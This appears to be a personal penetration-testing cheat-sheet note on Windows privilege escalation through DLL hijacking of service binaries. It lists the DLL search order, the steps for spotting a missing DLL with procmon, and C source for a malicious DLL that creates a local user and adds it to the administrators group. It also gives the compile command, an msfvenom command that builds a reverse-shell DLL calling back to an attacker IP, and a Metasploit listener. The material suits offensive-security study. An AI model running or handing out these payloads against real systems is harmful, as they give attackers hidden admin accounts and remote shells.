#priviledgeEscalation #windows 

[[Service Binary Hijacking]]

🔴 to check the environment variables to place DLL 
🔴 Sometimes you can **mv** the binary if **rm** doesn't work
```cmd
$env:path
```


```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```

### Steps

1. Find the vulnerable executable
2. Install procmon
3. Put a filter like this and Operation filter to CreateFile

![[Pasted image 20230705142241.png]]
 4. Register the service in attacker windows box
 ```powershell
 sc.exe create sch binPath= "C:\scheduler.exe"
```
 6. Start the service or the program
```powershell
Start-Service sch 
```

7. source code of the DLL 
```C
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

8. Compile

```bash
x86_64-w64-mingw32-gcc adduser.c --shared -o adduser.dll
```

### Reverse Shell Creation

DLL
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.189 LPORT=443 -f dll -o hey.dll
```

Listener
```bash
msfconsole -x "use exploit/multi/handler;set payload windows/x64/shell_reverse_tcp;set LHOST 192.168.45.187;set LPORT 443;run;"
```
